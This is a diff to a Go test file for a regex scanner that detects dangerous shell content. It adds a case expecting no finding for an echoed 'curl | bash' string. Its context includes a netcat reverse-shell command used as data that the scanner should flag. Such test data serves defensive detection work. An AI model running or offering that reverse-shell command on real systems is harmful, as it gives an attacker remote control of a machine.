@@ -52,6 +52,11 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
+		{
+			name:        "Safe Curl String",
+			content:     "echo \"curl | bash\"",
+			wantFinding: "",
+		},
 	}
 
 	for _, tt := range tests {
